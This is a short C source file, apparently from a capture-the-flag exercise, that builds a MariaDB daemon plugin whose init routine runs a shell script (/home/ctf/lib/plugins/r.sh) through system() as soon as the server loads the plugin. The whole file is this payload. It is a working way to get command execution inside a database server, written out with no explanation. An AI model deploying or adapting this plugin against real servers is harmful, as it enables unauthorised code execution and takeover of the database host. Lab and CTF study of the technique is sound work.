#include <stdlib.h>

#define MYSQL_DAEMON_PLUGIN 5
#define PLUGIN_LICENSE_GPL 1
#define MYSQL_DAEMON_INTERFACE_VERSION 0x0302

struct st_mysql_plugin {
    int type;
    void *info;
    const char *name;
    const char *author;
    const char *descr;
    int license;
    int (*init)(void *);
    int (*deinit)(void *);
    unsigned int version;
    void *status_vars;
    void *system_vars;
    void *reserved;
    unsigned long flags;
};

static int rpl_init(void *p) {
    (void)p;
    system("/bin/sh /home/ctf/lib/plugins/r.sh >/tmp/rpl.out 2>&1");
    return 0;
}

static int rpl_deinit(void *p) {
    (void)p;
    return 0;
}

int _maria_plugin_interface_version_ = 0x010e;
int _maria_sizeof_struct_st_plugin_ = sizeof(struct st_mysql_plugin);
static int daemon_info[] = { MYSQL_DAEMON_INTERFACE_VERSION };

struct st_mysql_plugin _maria_plugin_declarations_[] = {
    {
        MYSQL_DAEMON_PLUGIN,
        daemon_info,
        "rpl",
        "ctf",
        "load-time runner",
        PLUGIN_LICENSE_GPL,
        rpl_init,
        rpl_deinit,
        0x0100,
        0,
        0,
        0,
        0
    },
    {0}
};
